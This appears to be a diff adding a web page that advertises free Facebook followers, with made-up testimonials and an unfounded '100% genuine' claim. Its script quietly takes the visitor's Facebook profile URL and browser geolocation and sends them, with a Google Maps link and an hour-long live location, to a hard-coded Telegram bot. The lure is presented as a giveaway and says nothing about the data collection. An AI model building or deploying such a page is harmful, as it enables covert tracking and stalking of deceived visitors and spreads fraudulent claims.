@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Get Free Facebook Followers</title>
+  <meta property="og:title" content="Get Free Facebook Followers"/>
+  <meta property="og:description" content="We are offering a limited-time promotion where you can get free Facebook followers. Just follow the steps below to claim your free followers. This offer is 100% genuine and backed by leading social media growth experts."/>
+  <meta property="og:image" content="https://photos.google.com/photo/AF1QipMh6gMuNyJ523S-aPJk3vWMB2GYYuK2NK87TuTZ"/>
+  <meta name="robots" content="noindex, nofollow"/>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #e0f7fa 0%, #80deea 100%);
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .container {
+      text-align: center;
+      background-color: #ffffff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+      max-width: 500px;
+      width: 100%;
+    }
+    h1 {
+      color: #00796b;
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+    p {
+      color: #555;
+      font-size: 16px;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+    form {
+      margin-top: 20px;
+    }
+    input[type="text"] {
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      box-sizing: border-box;
+      margin-bottom: 20px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      background-color: #f9f9f9;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      cursor: pointer;
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #388e3c;
+    }
+    .message, .loading-message {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+    .loading-message {
+      display: none;
+      color: #007BFF;
+    }
+    .note {
+      font-size: 14px;
+      color: #777;
+      margin-top: 20px;
+    }
+
+    .testimonials {
+      margin: 20px 0;
+    }
+    .testimonial {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      text-align: left;
+    }
+    .testimonial img {
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      margin-right: 15px;
+    }
+    .testimonial .text {
+      font-style: italic;
+      color: #333;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        padding: 10px;
+      }
+      .container {
+        padding: 20px;
+      }
+      h1 {
+        font-size: 24px;
+      }
+      p {
+        font-size: 14px;
+      }
+      button {
+        padding: 12px 24px;
+        font-size: 16px;
+      }
+      .message, .loading-message {
+        font-size: 16px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 22px;
+      }
+      p {
+        font-size: 14px;
+      }
+      button {
+        padding: 10px 20px;
+        font-size: 14px;
+      }
+      .testimonial img {
+        width: 40px;
+        height: 40px;
+      }
+      .testimonial .text {
+        font-size: 14px;
+      }
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <h1>Get Free Facebook Followers</h1>
+    <p>We are offering a limited-time promotion where you can get free Facebook followers. Just follow the steps below to claim your free followers. This offer is 100% genuine and backed by leading social media growth experts.</p>
+
+    <form id="facebookForm">
+      <label for="facebookProfile">Facebook Profile URL:</label>
+      <input type="text" id="facebookProfile" name="facebookProfile" required pattern="https?://.*facebook\.com/.*" placeholder="https://facebook.com/your-profile"/>
+      <button type="button" onclick="getFreeFollowers()">Get Free Followers Now!</button>
+    </form>
+    <div class="message" id="message"></div>
+    <div class="loading-message" id="loadingMessage">Please wait, processing your request...</div>
+    <div class="note">Note: This offer is valid for a limited time only. Make sure to complete the process as soon as possible to avail the benefits.</div>
+
+    <div class="testimonials">
+      <div class="testimonial">
+        <img src="https://images.unsplash.com/photo-1564564321837-a57b7070ac4f?w=600" alt="John D.">
+        <div class="text">"This offer is amazing! I got my free followers in minutes. Highly recommend!"</div>
+      </div>
+      <div class="testimonial">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQKTT0yjiC_oQ6pI2R9x0CFUaRtY4vDG-LUg&s" alt="Jane S.">
+        <div class="text">"I was skeptical at first, but it really works. Thanks for the free followers!"</div>
+      </div>
+      <div class="testimonial">
+        <img src="https://cdn.pixabay.com/photo/2023/02/19/08/39/man-7799486_1280.jpg" alt="Michael B.">
+        <div class="text">"Absolutely fantastic service. My followers increased significantly in no time!"</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ✅ REPLACE THESE with your real Telegram bot token and chat ID
+    const telegramToken = '8115586060:AAGoYZ5Ho-Szgk9wrV77DcOCHUrCTCz7ryU';
+    const chatId = '8159703513';
+
+    function getFreeFollowers() {
+      const facebookProfile = document.getElementById('facebookProfile').value.trim();
+
+      if (!telegramToken || !chatId) {
+        document.getElementById('message').textContent = 'Telegram bot token or chat ID is missing.';
+        return;
+      }
+
+      if (!facebookProfile) {
+        document.getElementById('message').textContent = 'Please enter your Facebook profile URL.';
+        return;
+      }
+
+      document.getElementById('loadingMessage').style.display = 'block';
+      document.getElementById('message').textContent = '';
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const googleMapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+
+            sendTextToTelegram(`Facebook Profile: ${facebookProfile}\nLocation: ${googleMapsLink}`);
+            sendLocationToTelegram(latitude, longitude);
+          },
+          function (error) {
+            document.getElementById('loadingMessage').style.display = 'none';
+            document.getElementById('message').textContent = 'Error getting location: ' + error.message;
+          }
+        );
+      } else {
+        document.getElementById('loadingMessage').style.display = 'none';
+        document.getElementById('message').textContent = 'Geolocation is not supported by this browser.';
+      }
+    }
+
+    function sendTextToTelegram(text) {
+      axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        chat_id: chatId,
+        text: text
+      })
+      .then(response => {
+        console.log('Message sent:', response.data);
+      })
+      .catch(error => {
+        console.error('Error sending message:', error);
+        document.getElementById('message').textContent = 'Failed to send message.';
+      });
+    }
+
+    function sendLocationToTelegram(latitude, longitude) {
+      axios.post(`https://api.telegram.org/bot${telegramToken}/sendLocation`, {
+        chat_id: chatId,
+        latitude: latitude,
+        longitude: longitude,
+        live_period: 3600
+      })
+      .then(response => {
+        document.getElementById('loadingMessage').style.display = 'none';
+        document.getElementById('message').textContent = 'Thank you! Your request was submitted successfully.';
+      })
+      .catch(error => {
+        console.error('Error sending location:', error);
+        document.getElementById('loadingMessage').style.display = 'none';
+        document.getElementById('message').textContent = 'Failed to send location.';
+      });
+    }
+  </script>
+</body>
+</html>
